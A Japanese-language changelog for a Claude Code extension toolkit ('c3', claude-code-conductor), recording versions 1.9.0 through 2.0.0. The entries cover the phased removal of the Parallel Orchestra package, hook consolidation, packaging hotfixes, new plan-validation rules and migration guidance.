| `src/c3/db.py` | `_task_status_str` / `record_task_results` / `_PO_STATUS_VALID_STATES` / `upsert_po_status` / `fetch_po_status` / `fetch_po_results` を削除（PO 専用ヘルパー）。`TYPE_CHECKING` の `from parallel_orchestra.runner import TaskResult` も削除 |
| `src/c3/cli_doctor.py` | `_check_po()` 関数および `c3 doctor --check po-only` オプション削除。`parallel-orchestra` チェック行が doctor 出力から消える |
| `.claude/hooks/subagent_log.py` | `_maybe_upsert_po_status()` 関数および main() からの呼び出し削除。`C3_PO_WORKTREE_ID` / `C3_PO_SESSION_ID` の env 連動を削除 |

#### ドキュメント / hook の文言整理
- `.claude/agents/planner.md`: PO 言及を `parallel-agents` skill 向けに全面書き換え、`c3 po dry-run` → `c3 plan validate`、`_check_writes_conflicts` 言及を除去、**depth 1 制限の注意（tdd-develop を含む wave は 1 タスク推奨）を追記**
- `.claude/hooks/worktree_guard.py`: docstring から PO 言及削除（hook 自体は TDD ワークフロー用に残置）
- `.claude/hooks/select_tier.py` / `record_tier_outcome.py` / `record_review_decision.py` / `review_hint_inject.py`: docstring の旧 import 移行履歴コメントを整理

### 環境変数の rename

`locate_c3_db()` の探索順序が変更:
1. `C3_DB_PATH` (新規、v2.0.0 で導入)
2. `C3_PO_DB_PATH` (旧名、deprecated 警告付きで継続サポート)
3. cwd 上方向探索

`C3_PO_DB_PATH` は次の major バージョンで削除予定。新規利用は `C3_DB_PATH` を使うこと。

### 移行ガイド

#### v1.x 利用者向け

1. **pip パッケージ**: `pip install --upgrade claude-code-conductor` で v2.0.0 に上げると `parallel-orchestra` console script が site-packages から消える。`parallel-orchestra` を直接呼んでいたシェルスクリプト・CI ジョブは廃止か `claude` 直叩きに書き換え
2. **Python import**: `from parallel_orchestra import ...` / `from parallel_orchestra.c3_db import ...` を使っていれば `from c3.db import ...` に書き換え（v1.11.0 で shim 化、v2.0.0 で shim も削除）
3. **C3 利用先テンプレート**: `c3 update` で利用先環境のスキル・hook が v2.0.0 ベースに更新される。`po-status` / `wave-execution` skill は消え、`parallel-agents` が並列実装の単一窓口になる
4. **DB**: `c3.db` の `po_results` / `po_status` テーブルは次回セッション開始時に自動 DROP される（`session_start.py` の `apply_schema` 経由）。データ参照が必要なら事前にエクスポートしておくこと
5. **env 変数**: `C3_PO_DB_PATH` は使い続けられるが、v3.0.0 で削除予定。`C3_DB_PATH` への移行を推奨

### 検証

- `pytest tests/` 全体: **581 passed / 2 skipped**（v1.14.0 の 830 から `tests/parallel_orchestra/` 削除分の純減）
- `c3 doctor` exit 0、出力から `parallel-orchestra` 行が消滅
- `c3 plan validate` / `c3 plan waves` 正常動作（v1.14.0 で新設、PO 非依存）
- `c3 po` → `invalid choice` で失敗（v1.14.0 と同じ）
- wheel **74 entries**（v1.14.0 の 84 から -10）
- wheel 内に `parallel_orchestra` / `wave-execution` / `po-status` / `cli_po` のエントリ 0 件
- wheel の console scripts は `c3` のみ

### LTS について

v1.14.x は v2.0.0 リリース後も **最低 1 ヶ月の LTS 期間** を設定する。v1.x からの移行に時間が必要な利用者は `pip install "claude-code-conductor>=1.14,<2"` で固定可能。

### 参考

- 廃止計画: `~/.claude/plans/atomic-foraging-sprout.md`
- PoC 結果メモリ: `feedback_parallel_subagent_race_resolved.md`
- セマンティックバージョニング: 互換破壊リリースのため MAJOR 版（v1.x → v2.0.0）

---

## [1.14.0] - 2026-05-12

### 概要

PO（Parallel Orchestra）段階的廃止計画の **Step 4**。`c3 po` CLI と `wave-execution` skill を削除し、`parallel-agents` skill から PO への依存を断ち切った。新 CLI `c3 plan validate` / `c3 plan waves` を導入し、`parallel-agents` skill の Step 0/1 を `c3 po dry-run` / `c3 po waves` から `c3 plan validate` / `c3 plan waves` へ切り替えた。

これにより並列実装機能は **PO の Python パッケージに一切依存しない** 状態になった。`parallel_orchestra` パッケージ本体は v2.0.0 まで残置されるが、`develop` / `parallel-agents` skill の実行経路からは完全に外れた。

### 追加

| パス | 役割 |
|---|---|
| `src/c3/plan_validator.py` | plan-report YAML 検証 + DAG 分解の純粋関数（`extract_frontmatter` / `compute_waves` / `validate_plan_report` / `split_waves`）。`parallel_orchestra` 非依存 |
| `src/c3/cli_plan.py` | `c3 plan validate <path>` / `c3 plan waves <path>` サブコマンド |
| `tests/test_plan_validator.py` | 上記モジュールの単体テスト（20 ケース） |
| `tests/test_cli_plan.py` | 新 CLI の動作テスト（6 ケース） |

### 削除

| パス | 理由 |
|---|---|
| `src/c3/po/__init__.py` / `manifest.py` / `run.py` (合計 414 LOC) | C3 → PO の薄いラッパー層。`plan_validator.py` が機能を引き継ぐ |
| `src/c3/cli_po.py` (184 LOC) | `c3 po` サブコマンド。`cli_plan.py` で置換 |
| `.claude/skills/wave-execution/SKILL.md` | v1.12.0 で deprecated 化されていた旧並列実行 skill。`parallel-agents` skill で完全置換 |
| `tests/test_cli_po*.py` / `test_po_*.py` / `test_manifest_fixes.py` / `test_manifest_yaml_escape.py` (7 ファイル) | 削除されたモジュールのテスト |

### 変更

| パス | 内容 |
|---|---|
| `src/c3/cli.py` | `cli_po` の import / `register(sub)` を解除、代わりに `cli_plan` を追加。サブコマンド `po` が消え `plan` が追加 |
| `.claude/skills/parallel-agents/SKILL.md` | Step 0/1 を `c3 po dry-run` / `c3 po waves` から `c3 plan validate` / `c3 plan waves` に切り替え。移行期注意セクションも v1.14.0 完了状態に更新 |

### 移行ガイド

**旧コマンドからの移行:**
| 旧 (v1.13.x まで) | 新 (v1.14.0+) |
|---|---|
| `c3 po dry-run <plan-report>` | `c3 plan validate <plan-report>` |
| `c3 po waves <plan-report>` | `c3 plan waves <plan-report>` |
| `c3 po run <manifest>` | （直接代替なし。`parallel-agents` skill 経由で親 Claude が並列起動） |
| `c3 po run-wave <manifest> --wave-index N` | （同上） |

`c3 po` を呼び出していたスクリプト / hook / skill がある場合は `c3 plan` に書き換えること。本 リリースから `c3 po` は `invalid choice` で失敗する。

### 影響範囲

- `parallel-agents` skill: PO 非依存になり、`c3 plan` 経由で動作（並列起動・worktree 隔離・一括コミットの中核ロジックは変更なし）
- 利用先テンプレート (`c3 init` / `c3 update`): `wave-execution/SKILL.md` が消え、`c3 po` サブコマンドが廃止
- `parallel_orchestra` パッケージ本体: 影響なし。`c3.db` 経由で読み書きは継続動作（v2.0.0 で削除）
- F-001 (review_decisions) / F-005 (tier_bandit) / F-008 (agent_runs): 影響なし

### 検証

- `pytest tests/` 全体: **830 passed / 3 skipped**（v1.13.0 の 880 - 旧 PO テスト 76 件 + 新規 plan_validator/cli_plan テスト 26 件）
- `c3 plan validate` 動作確認: 正常 → exit 0、agent file 不在 → exit 2 で `task 't1': agent ... not found` エラー
- `c3 plan waves` 動作確認: 2-task plan-report で 2-wave JSON 出力
- `c3 po` 動作確認: `invalid choice: 'po' (choose from 'init', 'update', 'list-agents', 'list-skills', 'list-commands', 'doctor', 'plan', 'tier')`
- `c3 doctor` exit 0

### 次のステップ

- **Step 5 (v2.0.0)**: `parallel_orchestra` パッケージ本体の削除（互換破壊）。`pyproject.toml` の `parallel-orchestra` console script・wheel package 解除、`po_results` / `po_status` テーブル DROP、`.claude/docs/parallel-orchestra-manifest.md` / `po-worktree-writes.md` 削除、`planner.md` の PO 言及を `parallel-agents` 向けに最終調整
- v1.14.x を最低 1 ヶ月 LTS として維持してから v2.0.0 へ移行

### 参考

- 廃止計画: `~/.claude/plans/atomic-foraging-sprout.md`
- PoC 結果: `~/.claude/projects/.../memory/feedback_parallel_subagent_race_resolved.md`

---

## [1.13.0] - 2026-05-11

### 概要

PO（Parallel Orchestra）段階的廃止計画の **Step 3**。`po-status` skill と `c3 status` CLI を削除し、PO 観測系の利用先導線を切る。`po_results` / `po_status` テーブル本体は schema.sql に残置 deprecation し、v2.0.0 で書き込み元（runner.py）が削除されるまでテーブル定義は残す（利用先 DB ファイルへの破壊的変更を回避するため）。

`parallel-agents` skill（v1.12.0 で導入）は引き続き利用可能。本リリースは観測系の廃止のみで、並列実装機能には影響しない。

### 削除

| パス | 役割 |
|---|---|
| `.claude/skills/po-status/SKILL.md` | DuckDB の sqlite_scanner で `po_status` テーブルを参照していたリアルタイム可視化 skill。PO 廃止に伴い表示するものが無くなるため削除 |
| `src/c3/cli_status.py` (395 LOC) | `c3 status` サブコマンド。`po_status` / `po_results` テーブルを ANSI 整形で表示していた |
| `tests/test_cli_status.py` (8 ケース) | 上記 CLI の単体テスト |

### 変更

| パス | 内容 |
|---|---|
| `src/c3/cli.py` | `cli_status` の import / `register(sub)` 呼び出しを削除。サブコマンド一覧から `status` が消失 |

### 残置（deprecation only）

| 対象 | 理由 |
|---|---|
| `po_results` / `po_status` テーブル（schema.sql） | 利用先の既存 DB ファイルを破壊的変更しない方針。v1.14.0 までは `runner.py` の `record_task_results` / `upsert_po_status` 呼び出しが残り書き込みが続くため schema 定義も残す。v2.0.0 で `parallel_orchestra` パッケージ削除と同時にテーブル定義も削除予定 |

### 影響範囲

- `c3 status` を実行していたユーザー: `invalid choice: 'status' (choose from 'init', 'update', 'list-agents', 'list-skills', 'list-commands', 'doctor', 'po', 'tier')` で失敗する。PO 自体が廃止予定（v1.14.0）のため、後続のステップで `c3 po` も同様に削除される
- po-status skill を呼び出していたユーザー: 該当 skill が `/agents` インターフェースに出なくなる。代替なし（PO 廃止に伴う観測対象消失のため）
- DuckDB 経由で `c3.db` の `po_status` / `po_results` を直接クエリしていた外部ツール: テーブルは v2.0.0 まで残るので継続動作

### 検証

- `pytest tests/` 全体: **880 passed / 3 skipped**（v1.12.0 の 888 から `test_cli_status.py` 8 ケース削除分の減）
- `c3 status` → `invalid choice` エラー（exit code 2、廃止確認）
- `c3 doctor` exit 0、`parallel-orchestra: 1.13.0 (bundled)`
- skill 一覧で `po-status` が消滅していることを確認

### 次のステップ

- **Step 4 (v1.14.0)**: `c3 po` CLI / `cli_po.py` / `src/c3/po/` 廃止、`wave-execution` skill 削除、`parallel-agents` Step 0/1 を親 Claude 自前ロジックに切り替え
- **Step 5 (v2.0.0)**: `parallel_orchestra` パッケージ本体の削除（互換破壊）

### 参考

- 廃止計画: `~/.claude/plans/atomic-foraging-sprout.md`

---

## [1.12.0] - 2026-05-11

### 概要

PO（Parallel Orchestra）段階的廃止計画の **Step 2**。新 skill `parallel-agents` を追加し、`develop` skill のフェーズ D で参照する並列実装手順を PO から **親 Claude の Agent ツール並列起動 + 公式 `isolation: "worktree"`** に切り替えた。`wave-execution` skill は当面残置するが冒頭で deprecated 警告を明示し、v1.14.0 で削除予定。

機能変更は skill 層のみで、Python パッケージ・CLI・hook には変更なし。利用先で `c3 update` するとフェーズ D の挙動が parallel-agents 経由に切り替わる。

### 追加

| パス | 役割 |
|---|---|
| `.claude/skills/parallel-agents/SKILL.md` | wave 単位で親 Claude が Agent ツールを 1 ターン並列起動し、各 Agent が `isolation: "worktree"` で隔離 worktree 内に実装。親が wave 完了後に各 worktree から成果物を取り込み一括コミット |

### 変更

| パス | 内容 |
|---|---|
| `.claude/skills/develop/SKILL.md` | D-0 で po_plan_version 検出時の参照先を `wave-execution` → `parallel-agents` に切り替え。description も更新 |
| `.claude/skills/wave-execution/SKILL.md` | 冒頭に deprecated 警告ブロックを追加。description も「v1.12.0 で deprecated」と明示 |

### parallel-agents skill の核心

1. plan-report の YAML フロントマター（`po_plan_version`）を Step 0 で妥当性チェック、Step 1 で wave 分解（v1.14.0 まで `c3 po waves` 出力を流用）
2. Step 2 で各 wave をループ:
   - **並列化可能**な agent（`developer` / `tester` / `code-reviewer` / `security-reviewer` 等）は 1 ターン内で複数 Agent ツール並列起動（デフォルト 5、上限 15）
   - 各 Agent に `isolation: "worktree"` を指定して隔離
   - 子 Agent は **コミット禁止**、worktree path / writes / status を親に返す
   - **並列化不可**な `tdd-develop` は depth 1 制限により親 Claude のペルソナ採用で逐次実行
3. wave 完了後、親 Claude が各 worktree から成果物を `git checkout` で取り込み、一括コミット、worktree を `git worktree remove -f -f` で削除

### 重要な技術的制約: depth 1

Claude Code 公式仕様により**サブエージェントは更にサブエージェントを spawn できない**。これにより `tdd-develop`（内部で tester / developer を Agent ツールで spawn する設計）は Agent ツール並列起動の対象外。planner は plan-report 生成時に「tdd-develop を含む wave は 1 タスクのみ」と粒度を制御することが望ましい。

### PoC 検証根拠（再掲）

2026-05-11 PoC: 15 並列・101 tool 呼び出しで失敗 0 件。permission チェッカー race（Clade v1.19.0 当時の 76% DENIED defect）の構造的修正を確認済み。

### 検証

- `pytest tests/` 全体: **888 passed / 3 skipped**（regression なし）
- `c3 doctor` exit 0
- skill 一覧で `parallel-agents` 新規登場、`wave-execution` の description が deprecated 表記に更新確認

### 補足

- 旧 `wave-execution` skill 経由の PO 委譲（case B）は引き続き動作するが、新規利用は `parallel-agents` を選択すること
- v1.14.0 で `c3 po dry-run` / `c3 po waves` が削除されると、`parallel-agents` skill 内の Step 0 / Step 1 を「親 Claude が plan-report YAML を直接読んで DAG 分解」するロジックに切り替える
- 詳細計画: `~/.claude/plans/atomic-foraging-sprout.md`

---

## [1.11.1] - 2026-05-11

### 概要

v1.11.0 リリース直後の `c3_pip_test` での `c3 update --dry-run` 確認で、`.claude/docs/codex対応/` 配下 4 ファイルが wheel に混入し利用先環境を上書きすることを発見。配布元固有の個人作業ノート（codex 対応調査メモ）が利用先に押し付けられる defect のため hotfix リリース。

### 修正

- `src/c3/_excludes.py` の `EXCLUDE_PATTERNS` に `docs/codex対応/*` を追加
- `hatch_build.py` の `EXCLUDE_PATTERNS` にも同じく追加（3 ファイル同期グループの duplicate 必須箇所）
- `.gitignore` 側は v1.11.0 リリース時点で既に `.claude/docs/codex対応/` を除外しているため変更不要

### 補足

- `phased_release_with_hotfix` パターン通り、minor リリース直後の `c3_pip_test` での確認で wheel 混入 defect を即発見できた（v1.10.3 と同型）
- v1.10.3 の `memory/llm_summary.md` 混入 defect と同じく、`.gitignore` だけでなく `_excludes.py` / `hatch_build.py` の 3 箇所同期が必要であることが再演された
- v1.11.0 の機能変更（c3.db ヘルパー移管）は本リリースに含まない（hotfix のみ）

---

## [1.11.0] - 2026-05-11

### 概要

PO（Parallel Orchestra）段階的廃止計画の **Step 1**（非破壊）。Claude Code 本体で並列 subagent 起動時に発生していた permission チェッカー race（Clade v1.19.0 で発見）が構造的に解決されたことを 2026-05-11 の PoC で確認した（15 並列・101 tool 呼び出しで失敗 0 件）。これに伴い PO の存在意義が消失したため、v1.11.0〜v2.0.0 で段階的に PO を廃止する。本リリースはその第 1 段で、`parallel_orchestra.c3_db`（741 LOC）を `c3.db` に物理移動するのみ。**配布物・利用先環境への挙動変化はない**（shim で後方互換維持）。

### 移管（後方互換）

| 対象 | 変更 |
|---|---|
| `src/parallel_orchestra/c3_db.py` | 内容を `src/c3/db.py` に移動。元ファイルは `from c3.db import *` の薄い shim として残置（v2.0.0 で削除予定） |
| `src/c3/db.py` | 新規。F-001 `review_decisions` / F-002 `po_results` / F-003 `po_status` / F-005 `tier_bandit` ヘルパーの新しい単一ソース |

### 内部 import 切り替え（配布元のみ、利用先挙動は不変）

| ファイル | 変更前 | 変更後 |
|---|---|---|
| `src/parallel_orchestra/runner.py` | `from .c3_db import ...` | `from c3.db import ...` |
| `src/c3/cli_status.py` | `from parallel_orchestra import c3_db` | `from c3 import db as c3_db` |
| `src/c3/cli_tier.py` | 同上 | 同上 |
| `.claude/hooks/select_tier.py` | `_load_c3_db_module()` 内で `from parallel_orchestra import c3_db` | `from c3 import db as c3_db` (sys.path 操作削除) |
| `.claude/hooks/record_tier_outcome.py` | 同上 | 同上 |
| `.claude/hooks/record_review_decision.py` | `from parallel_orchestra.c3_db import insert_review_decision` | `from c3.db import insert_review_decision` (`_ensure_src_on_path` 削除) |
| `.claude/hooks/review_hint_inject.py` | `from parallel_orchestra import c3_db` | `from c3 import db as c3_db` |
| `.claude/hooks/po_heartbeat.py` | `from parallel_orchestra.c3_db import upsert_po_status` | `from c3.db import upsert_po_status` |
| `.claude/hooks/subagent_log.py` | 同上 | 同上 |
| `tests/hooks/*.py` (4 ファイル) | `from parallel_orchestra import c3_db` | `from c3 import db as c3_db` |
| `tests/parallel_orchestra/*.py` (3 ファイル) | 同上 + `import parallel_orchestra.c3_db as c3_db_mod` | `from c3 import db as c3_db` + `import c3.db as c3_db_mod` |
| `tests/test_cli_status.py` / `tests/test_cli_tier.py` | 同上 | 同上 |

### 検証

- `pytest tests/` 全体: 888 passed / 3 skipped（regression なし）
- `c3 doctor` exit 0
- `parallel_orchestra.c3_db` shim 経由の import も継続動作（既存利用者の互換性確保）

### 補足

- 次の Step 2 (v1.12.0) では新 skill `parallel-agents` を追加し、wave-execution の並列実装を親 Claude の Agent ツール並列起動 + 公式 `isolation: worktree` で代替する設計に移行する
- `parallel_orchestra` パッケージ本体の削除は v2.0.0（互換破壊）まで先送り
- PoC 結果と PO 廃止計画の詳細は `~/.claude/plans/atomic-foraging-sprout.md` および `~/.claude/projects/.../memory/feedback_parallel_subagent_race_resolved.md` を参照

---

## [1.10.3] - 2026-05-11

### 概要

v1.10.2 リリース直後の `c3_pip_test` での `c3 update --dry-run` 確認で、`.claude/memory/llm_summary.md` が wheel に混入し利用先環境の同名ファイルを上書きしていることを発見。配布元固有の LLM 要約（生成日時付きの作業状態スナップショット）が利用先に押し付けられる defect のため hotfix リリース。

### 修正

- `src/c3/_excludes.py` の `EXCLUDE_PATTERNS` に `memory/llm_summary.md` を追加
- `hatch_build.py` の `EXCLUDE_PATTERNS` にも同じく追加（3 ファイル同期グループの duplicate 必須箇所）
- `.gitignore` 側はもとから `.claude/memory/llm_summary.md` を除外しているため変更不要

### 補足

- 他の `memory/*` 個人状態ファイル（`patterns.json` / `agent-audit.log` / `consolidated_summary.md` / `promotion-candidates.md`）は v1.10.2 以前から既に除外されていたが、`llm_summary.md` だけ漏れていた
- 今回も `phased_release_with_hotfix` パターン通り、minor/patch リリース直後の `c3_pip_test` 確認で wheel 混入 defect を即発見できた

---

## [1.10.2] - 2026-05-11

### 概要

`planner` エージェントが出力する `plan-report-*.md` を機械検査する hook を導入し、planner 側にも検査ルール (R1〜R4) と自己チェックリストを明記する。過去 v1.1.0 / v1.4.0 / v1.10.0 で再発した plan-report 起因の defect（test-report writes 漏れ・reviewer ファイル名タイムスタンプ・`src/c3/_template/` 直接 writes・writes 衝突の順序付け不足）を planner 出力時点と PostToolUse 時点の二段で検出する。

**end user の wheel 挙動は version bump 以外不変**。`.dev/hooks/_planner_check.py` 本体は配布元限定（`.gitignore` + `_excludes.py` / `hatch_build.py` で配布除外）。配布物に入る差分は以下の 3 点:

- `c3/__init__.py` の `__version__` を `1.10.1` → `1.10.2`
- `.claude/agents/planner.md` に R1〜R4 の説明と自己チェックリストを追記
- `tests/hooks/test_planner_check.py` を新規追加（32 ケース）

### 追加（配布元限定）

| パス | 役割 | hook イベント | 動作 |
|---|---|---|---|
| `.dev/hooks/_planner_check.py` | `.claude/reports/plan-report-*.md` の YAML frontmatter を機械検査 | PostToolUse (Write/Edit) | R3 違反は exit 2 でブロック、R1 / R2 / R4 は stderr 警告のみ |

#### 検査ルール

- **R1 (tdd-develop writes 完備)** — `agent: tdd-develop` の task の `writes` に、(a) `tests/` で始まるテストファイルの具体的パス、(b) `.claude/reports/test-report-{任意}.md` の具体的パス、の両方を列挙する。glob (`*`) 入りは不可
- **R2 (reviewer ファイル名は task_id ベース)** — `code-reviewer` / `security-reviewer` の `writes` ファイル名にタイムスタンプ風パターン (`YYYYMMDD` / `YYYYMMDD-HHMMSS`) を含めない。task_id の数字 8 桁は前後の境界判定で誤検知回避
- **R3 (`src/c3/_template/` 直接 writes 禁止)** — どの task も `writes` に `src/c3/_template/` パスを含めない（hook が exit 2 でブロック）
- **R4 (writes 衝突 + depends_on 順序付け)** — 同一 `writes` パスを複数 task が宣言する場合は、後発 task の `depends_on` で先発 task を参照して推移閉包で順序付けする

### 配布物への変更

- `.claude/agents/planner.md`: 「自動検査対象（PostToolUse hook）」セクションを追加し、R1〜R4 の説明と planner 自己チェックリストを記述。`Tools & Constraints` にも違反防止を明記
- `tests/hooks/test_planner_check.py`: 32 ケース（R1 9 件 / R2 7 件 / R3 3 件 / R4 3 件 / OutOfScope 9 件 / 境界 1 件）。E2E で過去 v1.1.0 defect plan-report (`plan-report-20260502-000001.md`) で R3 ブロック発火を再確認、正常 plan で false-positive ゼロ

### 補足

- 新知見: PostToolUse hook の `exit 2` (block) は LLM の system reminder へ block error として surface される（`exit 0` + stderr の warning は surface されない）。これにより planner が違反 plan-report を書いた瞬間にコンテキストへフィードバックが返り、自己修正できる動線が成立
- `_template_guard.py` (PreToolUse) との二重防御: planner が plan-report に `src/c3/_template/` を書いた段階で `_planner_check.py` がブロックし、万一 plan-report が通っても tdd-develop 実行時に `_template_guard.py` が再度ブロックする

---

## [1.10.1] - 2026-05-11

### 概要

配布元リポジトリ専用の事故防止 hook 群を `.dev/hooks/` に追加。`src/c3/_template/` 直接編集の誤操作・3 ファイル同期グループ (`.gitignore` / `_excludes.py` / `hatch_build.py`) の漏れ・`pip install -e .` 再実行忘れによる version 同期漏れ（v1.4.0 / v1.10.0 で再発した defect）を構造的に予防する。

**end user の wheel 挙動は不変**（差分は version bump のみ）。これらの hook と登録は配布元のみで動作し、配布物には含まれない:

- `.dev/hooks/` は `.gitignore` 対象、`_excludes.py` / `hatch_build.py` の配布除外対象でもある
- 登録先 `.claude/settings.local.json` も同じく配布除外
- 配布物 wheel に入る差分: `c3/__init__.py` の `__version__` を `1.10.0` → `1.10.1`

### 追加（配布元限定）

| パス | 役割 | hook イベント | 動作 |
|---|---|---|---|
| `.dev/hooks/_template_guard.py` | `src/c3/_template/` 配下への Write/Edit を機械的にブロック | PreToolUse (Write/Edit) | exit 2 でブロック。`C3_TEMPLATE_GUARD_DISABLE=1` で緊急 bypass |
| `.dev/hooks/_sync_check.py` | 3 ファイル同期グループのいずれかを変更したら他 2 件の同期確認を促す | PostToolUse (Write/Edit) | stderr 警告のみ・ブロックしない |
| `.dev/hooks/_pip_reinstall_reminder.py` | `src/c3/__init__.py` / `pyproject.toml` 変更時に `pip install -e .` 再実行を促す | PostToolUse (Write/Edit) | stderr 警告のみ・ブロックしない |
| `CLAUDE.md` (リポジトリルート) | 配布元専用ルールの集約。Claude Code 起動時に system reminder へ自動注入される | — | gitignore 対象（`/CLAUDE.md` のリーディングスラッシュでルート限定 ignore） |

### テスト追加（配布物には未同梱）

`tests/hooks/` に上記 hook の単体テスト + 設定ポリシーの構造検証を追加（44 ケース、全 PASS）:

- `test_template_guard.py`: 12 ケース（ブロック条件・パス解決・bypass・例外耐性）
- `test_sync_check.py`: 13 ケース（warn / no-warn / never blocks）
- `test_pip_reinstall_reminder.py`: 13 ケース（同上）
- `test_settings_local_absolute_paths.py`: 4 ケース（`settings.local.json` の hook commands が `$CLAUDE_PROJECT_DIR` または OS 絶対パスのみであることを機械検証。過去 defect「相対パス hooks による settings 上書き」の構造的予防）

### リポジトリ運用変更

- `.claude/settings.local.json` を git tracking から除外（`git rm --cached` + `.gitignore` 追加）。理由: per-user / per-worktree のローカル設定として扱う方針を明確化。wheel への配布は `_excludes.py` / `hatch_build.py` で従来から既に除外されており、end user 影響なし
- `.gitignore` に `.dev/` / `/CLAUDE.md` / `.claude/settings.local.json` の 3 件を追加

### 補足

- v1.10.0 リリース時に `parallel_orchestra.__version__` が `1.9.0` のまま wheel に取り込まれた事象が発生（`pip install -e .` 未再実行が原因）。今回 `_pip_reinstall_reminder.py` を追加して再発防止
- 全 hook command は `$CLAUDE_PROJECT_DIR` または OS 絶対パスを使用。過去に相対パス hooks が `settings.json` を上書きする defect があり、`test_settings_local_absolute_paths.py` で構造的に予防

---

## [1.10.0] - 2026-05-10

### マイルストーン

短期間に F-001〜F-010 を実装した結果、フックが 13 本以上に増え、LLM が SKILL.md の手順を読み解いて正しく呼び出すための認知負荷が高まっていた。本リリースは **コードベースの機能を一切削らずに**「同一イベントで同時発火するフック」と「init-session で手動 2 回呼び出していた起動スクリプト」を統合することで、settings.json と LLM の負担を削減する内部リファクタリング。回帰テスト 812 passed / 3 skipped を維持しつつ、hook commands を 14 → 11 に削減。

### 内部リファクタリング

#### SessionStart 統合 + 自動発火

`clear_file_history.py` (47 行) / `enable_sandbox.py` (77 行) / `init_c3_db.py` (107 行) を **`session_start.py` 1 本に統合**。settings.json の SessionStart hook に登録して自動発火させ、`init-session` SKILL.md の Step 0（「2 回に分けて手動実行」指示）を完全削除。

- 各ハンドラ（`_run_clear_file_history` / `_run_enable_sandbox` / `_run_init_c3_db`）は独立して try/except でラップ。1 つが失敗しても他は実行
- `apply_schema()` / `SCHEMA_VERSION` / `FILE_HISTORY_DIR` / `FULL_SANDBOX_CONFIG` は test 互換性のため module レベルで公開
- 既存テスト 31 ケース（旧 3 ファイル分）を `tests/hooks/test_session_start.py` に統合し、orchestration テスト 4 件を追加

#### Stop Orchestrator 統合

`stop.py` + `consolidate_memory.py` の 2 本登録を `session_stop.py` 1 本に集約し、stdin 読み出し 1 回で順次実行する形に。

- `stop.py` に `run(payload)` 関数を抽出（`main()` は後方互換のため残す）
- `consolidate_memory.py` の `_full_sync_main()` から stdin 読み出しを切り離し、`run_sync(today=None)` を追加
- `_spawn_detached_llm()` で `consolidate_memory.py --llm-only <iso>` を subprocess 起動する仕組みは維持（ファイル名と CLI 仕様は不変）
- `tests/hooks/test_session_stop.py` を新規作成（7 ケース、stdin 一回読み・失敗隔離・E2E）

#### PostToolUse 統合

`validate_skill_change.py` (35 行) を `post_tool.py` に統合し、Write/Edit ごとに 2 hooks 同時発火していた構成を 1 hook に。

- `_check_skills_change()` を `post_tool.py` に追加（skills/ 警告は stdout、quality 警告は stderr の使い分けは現状維持）
- `tests/hooks/test_post_tool.py` に skills/ 通知テスト 5 件を追加（既存 15 + 新規 5 = 20 ケース）

### 削除

| ファイル | 行数 | 統合先 |
|---|---|---|
| `.claude/hooks/clear_file_history.py` | 47 | `session_start.py::_run_clear_file_history` |
| `.claude/hooks/enable_sandbox.py` | 77 | `session_start.py::_run_enable_sandbox` |
| `.claude/hooks/init_c3_db.py` | 107 | `session_start.py::_run_init_c3_db` + `apply_schema` |
| `.claude/hooks/validate_skill_change.py` | 35 | `post_tool.py::_check_skills_change` |
| `tests/hooks/test_clear_file_history.py` | 308 | `tests/hooks/test_session_start.py` |
| `tests/hooks/test_enable_sandbox.py` | 188 | 同上 |
| `tests/hooks/test_init_c3_db.py` | 271 | 同上 |
| `tests/test_clear_file_history.py` | 387 | 同上 |
| `tests/test_enable_sandbox.py` | 287 | 同上 |
| `tests/test_validate_skill_change.py` | 494 | `tests/hooks/test_post_tool.py` |
| `tests/test_sync_template_clear_file_history.py` | 48 | 不要（削除済み） |
| `tests/test_sync_validate_skill.py` | 108 | 不要（削除済み） |

### 追加

- `.claude/hooks/session_start.py` (約 240 行) — SessionStart 3 ハンドラ統合
- `.claude/hooks/session_stop.py` (約 90 行) — Stop hook orchestrator
- `tests/hooks/test_session_start.py` (24 ケース)
- `tests/hooks/test_session_stop.py` (7 ケース)

### 設定変更

`.claude/settings.json`:
- **PostToolUse**: Write/Edit ごとに 2 hooks → 1 hook
- **SessionStart**: `init_c3_db.py` → `session_start.py`
- **Stop**: `stop.py` + `consolidate_memory.py` → `session_stop.py`
- permissions allow リストから旧 4 ファイル分のエントリを削除（合計 8 行削減）

`.claude/skills/init-session/SKILL.md`:
- Step 0「初期化スクリプトを実行する」セクションを削除
- 概要に「SessionStart hook で session_start.py が自動実行される前提」と注記

### 数値で見る効果

| 指標 | 変更前 | 変更後 |
|---|---|---|
| settings.json hook commands | 14 | **11** |
| `.claude/hooks/` Python ファイル | 15 | **13** |
| init-session SKILL.md 手動初期化呼び出し | 2 回 | **0 回** |
| 全体テスト | 812 passed | **812 passed** |

### 設計判断

- **stop.py / consolidate_memory.py の本体は残す**: `consolidate_memory.py --llm-only` 子プロセス起動の互換維持と、リファクタリング影響範囲の最小化のため。`session_stop.py` は importlib で動的ロードして関数として呼び出す
- **session_start.py は単一ファイルに統合（A 案）**: 3 ハンドラ合計 230 行は単一ファイルで管理可能。orchestrator + サブモジュール構造（B 案）は過剰設計
- **enable_sandbox の `is_worktree()` ガードは維持**: worktree 内で settings.json を破壊しないための重要なガード。新コードでも継承

### スコープ外

- `consolidate_memory.py` (1093 行) の sync / LLM 部分への分割: 別タスク
- 手動呼び出し CLI (`record_tier_outcome.py` / `record_review_decision.py` / `review_hint_inject.py`) の自動発火化: より大きな設計変更が必要なため別タスク
- `_template/` の自動生成は `hatch_build.py` 経由で実施（手動同期不要）

### 関連コミット

- 単一 commit でリリース予定

---

## [1.9.0] - 2026-05-10

### マイルストーン

F-005（Tier 自動ルーティング）の効果計測手段として `c3 tier stats` サブコマンドを追加する minor リリース。F-005 は MVP 後に Phase 2-A（PO 経由 model 動的切替）/ 2-B（Haiku 失敗時 Sonnet 昇格）/ 2-C（過去類似タスクからの complexity 補正）が順次実装されていたが、実コードと社内ドキュメント `.claude/docs/c3追加予定機能リスト.md` のステータス記述に乖離があり、棚卸し時に誤認していた。本リリースで両方を解消。`tier_bandit` / `tier_recent_outcomes` テーブルの内容を表形式 + JSON で可視化し、学習進捗（合計 N/30 試行）/ 期待成功率 / 直近 outcome 履歴を C3 ユーザーが直接確認できる。

### 新機能

#### `c3 tier stats` サブコマンド

`src/c3/cli_tier.py` を新規追加し、`src/c3/cli.py` に登録。

```
c3 tier stats             # 全 complexity × tier の累積 + 直近 outcome を表形式表示
c3 tier stats --json      # 機械可読 JSON 出力
c3 tier stats --recent N  # 直近 outcome の表示件数（デフォルト 10）
```

表示内容:
- 学習データ収集状況（X / 30 試行 + uniform / thompson モード判定）
